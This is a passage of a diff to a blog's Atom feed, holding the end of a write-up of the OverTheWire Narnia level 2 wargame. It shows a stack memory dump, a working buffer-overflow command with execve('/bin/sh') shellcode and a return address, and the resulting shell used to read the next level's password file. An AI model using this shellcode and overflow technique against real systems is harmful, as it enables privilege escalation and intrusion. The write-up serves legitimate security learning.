-0xffffd810:	0x00000000	0x6d61672f	0x6e2f7365	0x696e7261
-0xffffd820:	0x616e2f61	0x61696e72	0x41410032	0x41414141
-0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd890:	0x41414141	0x41414141	0xc0314141	0x2f2f6850
-0xffffd8a0:	0x2f686873	0x896e6962	0x89c189e3	0xcd0bb0c2
-0xffffd8b0:	0x40c03180	0x424280cd	0x58004242	0x535f4744
-0xffffd8c0:	0x49535345	0x495f4e4f	0x30323d44	0x33323431
-0xffffd8d0:	0x45485300	0x2f3d4c4c	0x2f6e6962	0x68736162
-0xffffd8e0:	0x52455400	0x74783d4d	0x2d6d7265	0x63363532
-0xffffd8f0:	0x726f6c6f	0x48535300	0x494c435f	0x3d544e45
-0xffffd900:	0x362e3938	0x36312e34	0x3732312e	0x30333320
-0xffffd910:	0x32203434	0x53530032	0x54545f48	0x642f3d59
-0xffffd920:	0x702f7665	0x342f7374	0x434c0033	0x4c4c415f&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, we can see that even with the shellcode B's overwrote the EIP. Now let's try it with the actuall address - somewhere in the middle of the A letters. Maybe &lt;b&gt;0xffffd863&lt;/b&gt;?&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia2@melinda:/narnia$ ./narnia2 $(python -c &quot;print 'A' * 112 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\x63\xd8\xff\xff'&quot;)
-$ whoami
-narnia3
-$ cat /etc/narnia_pass/narnia3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And we've got the password to the next level!&lt;/p&gt;
-
-&lt;h1&gt;Conclusion&lt;/h1&gt;
-&lt;p&gt;The challenge was awesome, but really time consuming. It was worth every minute as I learned a lot from trying out these different ways to finish this level. Thanks &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;!&lt;/p&gt;
-
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry></feed>
+&lt;p&gt;~ Stay safe! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Vulnhub" /><summary type="html">Introduction</summary></entry></feed>
